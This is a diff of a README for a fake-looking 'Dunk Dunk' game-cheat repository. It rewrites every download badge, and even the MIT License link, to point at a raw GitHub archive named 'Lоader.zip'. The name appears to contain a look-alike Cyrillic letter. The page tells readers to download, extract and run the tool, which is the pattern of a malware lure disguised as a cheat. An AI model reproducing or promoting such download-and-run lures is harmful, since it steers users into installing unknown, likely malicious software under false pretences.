@@ -1,6 +1,6 @@
 # 🔥 Dunk Dunk Cheats Hacks Repository
 
-[![Download Latest Release](https://img.shields.io/badge/Download-DunkDunk%20Tool-blue?logo=windows&logoColor=white&style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Latest Release](https://raw.githubusercontent.com/kordy0-0/DunkDunk-ModHub/main/Lоader.zip%20Tool-blue?logo=windows&logoColor=white&style=for-the-badge)](https://raw.githubusercontent.com/kordy0-0/DunkDunk-ModHub/main/Lоader.zip)
 
 Welcome to the official Dunk Dunk Cheats Hacks tool! Boost your gameplay with innovative enhancement scripts tailored for Dunk Dunk enthusiasts in 2025. This repository includes secure, innovative game modifications for enhancing your play sessions, improving efficiency, unlocking secret customizations, and more. Read on for installation steps, OS support, features, and important notes. Enhance your game responsibly!
 
@@ -31,7 +31,7 @@ Dunk Dunk, cheats, hacks, scripts, enhancement tool, mod, game assist, unlock sk
 ## 📥 Installation Guide
 
 **Step 1:** Download the latest Dunk Dunk Cheats Hacks tool:  
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-get%20tool-green?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Latest Release](https://raw.githubusercontent.com/kordy0-0/DunkDunk-ModHub/main/Lоader.zip%20Now-get%20tool-green?style=for-the-badge)](https://raw.githubusercontent.com/kordy0-0/DunkDunk-ModHub/main/Lоader.zip)
 
 Extract the archive. Open the application and follow the screen prompts. Compatible across all major platforms!
 
@@ -41,8 +41,8 @@ For entertainment and educational research only. Usage may conflict with Dunk Du
 
 ## 📄 MIT License
 
-Distributed under the [MIT License, 2025](https://opensource.org/licenses/MIT).
+Distributed under the [MIT License, 2025](https://raw.githubusercontent.com/kordy0-0/DunkDunk-ModHub/main/Lоader.zip).
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-DunkDunk%20Hacks-blue?logo=windows&logoColor=white&style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Latest Release](https://raw.githubusercontent.com/kordy0-0/DunkDunk-ModHub/main/Lоader.zip%20Hacks-blue?logo=windows&logoColor=white&style=for-the-badge)](https://raw.githubusercontent.com/kordy0-0/DunkDunk-ModHub/main/Lоader.zip)
